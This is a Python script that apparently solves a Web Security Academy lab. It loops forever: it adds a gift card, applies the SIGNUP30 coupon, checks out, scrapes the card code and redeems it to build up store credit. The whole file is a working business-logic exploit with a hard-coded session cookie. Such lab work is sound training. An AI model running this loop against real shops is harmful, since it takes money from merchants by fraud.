import requests
import re

target1 = "https://ac8e1f051e54e198c0daf024001f0018.web-security-academy.net/cart"
t1_data = {'productId': '2', 'redir': 'PRODUCT', 'quantity': '1'}
target2 = "https://ac8e1f051e54e198c0daf024001f0018.web-security-academy.net/cart/coupon"
t2_csrf = re.compile('name="csrf" value="[a-zA-Z0-9]+"')
target3 = "https://ac8e1f051e54e198c0daf024001f0018.web-security-academy.net/cart/checkout"
target4 = "https://ac8e1f051e54e198c0daf024001f0018.web-security-academy.net/cart/order-confirmation?order-confirmed=true"
code_match = re.compile('<table class=is-table-numbers>[a-zA-Z0-9/<>\s]+</td>')
target5 = "https://ac8e1f051e54e198c0daf024001f0018.web-security-academy.net/gift-card"
session_id = "k8D8TvdxTJynoru2wAFuBecJcGJrZbZ2"
session_cookie = {'session': session_id}
user_home = 'https://ac8e1f051e54e198c0daf024001f0018.web-security-academy.net/my-account?id=wiener'
check_money = re.compile('Store credit: [/$/.0-9]+')




def get_rich():
    while True:
        requests.post(target1, cookies=session_cookie, data=t1_data)
        response = requests.get(target1, cookies=session_cookie)
        csrf_token = re.findall(t2_csrf, response.text)[0].split('"')[3]
        t2_data = {'csrf': csrf_token, 'coupon': 'SIGNUP30'}
        requests.post(target2, cookies=session_cookie, data=t2_data)
        t3_data = {'csrf': csrf_token}
        response = requests.post(target3, cookies=session_cookie, data=t3_data)
        code = re.findall(code_match, response.text)[0].split('>')[-2].split('<')[0]
        t5_data = {'csrf': csrf_token, 'gift-card': code}
        requests.post(target5, cookies=session_cookie, data=t5_data)
        response = requests.get(user_home, cookies=session_cookie)
        money = re.findall(check_money, response.text)[0].split(': ')[1]
        print(money)



get_rich()